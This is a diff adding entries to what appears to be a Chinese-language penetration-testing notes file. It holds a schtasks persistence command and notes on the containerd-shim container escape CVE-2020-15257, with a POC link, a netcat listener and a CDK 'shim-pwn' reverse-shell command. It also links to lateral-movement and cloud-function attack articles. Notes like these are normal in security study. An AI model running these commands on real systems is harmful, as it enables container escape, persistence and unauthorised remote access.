@@ -110,7 +110,42 @@ C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Com
 C:\Windows\system32\cmd.exe /C powershell.exe -PSConsoleFile exshell.psc1 -Command "Get-MailboxExportRequest -Mailbox user@organization.here | Remove-MailboxExportRequest -Confirm:$False"
 ```
 
+- [windows 计划任务隐藏新姿势分享](https://paper.seebug.org/1464/)
+> schtasks.exe /create /tn test /tr "calc.exe" /sc minute /mo 1 /ru "administrator"
 
+- [ACTIVE DIRECTORY PENTEST CHEAT SHEET - LATERAL MOVEMENT & PERSISTENCE TECHNIQUES](https://www.hackingdream.net/2021/05/ad-pentest-cheatsheet-lateral-movement-persistence.html)
+
+
+## 云安全
+- [Docker容器逃逸漏洞CVE-2020-15257]()
+```text
+在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。
+POC下载：https://github.com/Xyntax/CDK/releases/tag/0.1.6
+cat /proc/net/unix|grep -a "containerd-shim"
+原理备注：containerd->containerd-shim->runc 的通信模型中，containerd-shim的接口作为abstract unix socket暴露，在docker使用--net=host参数启动、与宿主机共享net namespace时，其中的unix socket可以被容器内部访问到，容器中攻击者通过该socket可以通过API控制下游runc进程启动新的恶意镜像，并通过该镜像逃逸。
+Attack：nc -lvp 12345
+Client：./cdk_linux_386 run shim-pwn 192.168.163.131 12345
+关于K8s容器安全渗透，腾讯蓝军已经研究的很深，安全人员研究的方向应该看向运维，看他们使用哪些系统等；
+```
+
+- [云原生基础设施安全初探](https://security.tencent.com/index.php/blog/msg/190)
+
+- [云原生安全白皮书中文版](https://mp.weixin.qq.com/s/WKCziOYpFBP7tmzh7927AA)
+
+- [CDN+FAAS打造攻击前置](http://blog.nsfocus.net/cdn-faas/)
+```bash
+攻击者又转而对其中一种称之为云函数（FaaS，Function as a Service）
+滥用云函数作为攻击前置的方法早在2018年就被提出
+增强基础设施在伪装性、探测监控及溯源反制等方面的能力
+随着攻防对抗形势的白热化发展，对抗升级的过程愈发对OPSEC提出了更高的要求
+```
+
+- [云原生](https://www.hi-linux.com/posts/14157.html#vip-container)
+> 介绍每一层的应用以及工作原理
+
+
+
+前期阅读文章时记录的格式和以前不一样，现在转换成markdown较为麻烦，有空就更新一下
 
 
 
